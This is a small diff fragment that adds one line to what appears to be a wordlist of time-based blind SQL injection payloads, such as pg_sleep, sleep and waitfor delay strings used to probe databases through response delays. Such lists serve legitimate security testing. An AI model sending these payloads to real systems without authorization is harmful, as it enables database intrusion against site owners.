@@ -100,3 +100,4 @@ pg_sleep(5) —-
 if(now()=sysdate(),sleep(20),0)
 132'; waitfor delay '0:0:6' -- 
 (SELECT(0)FROM(SELECT(SLEEP(10)))a)
+`'; waitfor delay '0:0:6' -- `
